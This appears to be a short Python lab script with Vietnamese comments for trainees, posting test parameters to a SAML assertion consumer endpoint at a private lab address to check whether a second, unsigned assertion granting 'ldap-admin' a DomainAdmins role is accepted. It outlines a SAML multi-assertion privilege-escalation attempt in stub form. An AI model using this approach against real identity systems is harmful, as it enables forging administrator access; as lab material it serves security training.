#!/usr/bin/env python3
import requests

# [HỌC VIÊN CÓ THỂ CHỈNH SỬA PAYLOAD HOẶC THAM SỐ GỬI TẠI ĐÂY]
SP_ACS_URL = "http://172.20.0.20/saml/acs"

def run_integrity_check():
    print("[*] Đang thực thi script kiểm thử tích hợp XML trên SP-App...")
    
    # Học viên có thể chỉnh sửa trực tiếp các tham số kiểm thử bên dưới
    test_params = {
        "test_mode": "multi_assertion_check",
        "signed_subject": "student",
        "secondary_subject": "ldap-admin",
        "secondary_role": "DomainAdmins"
    }
    
    try:
        response = requests.post(SP_ACS_URL, data=test_params)
        if response.status_code == 200 and "DomainAdmins" in response.text:
            print("[+] Ghi nhận: SP-App phản hồi dữ liệu khối Assertion phụ thành công.")
        else:
            print("[-] SP-App đã từ chối hoặc chặn gói tin.")
    except Exception as e:
        print(f"[-] Lỗi: {e}")

if __name__ == "__main__":
    run_integrity_check()
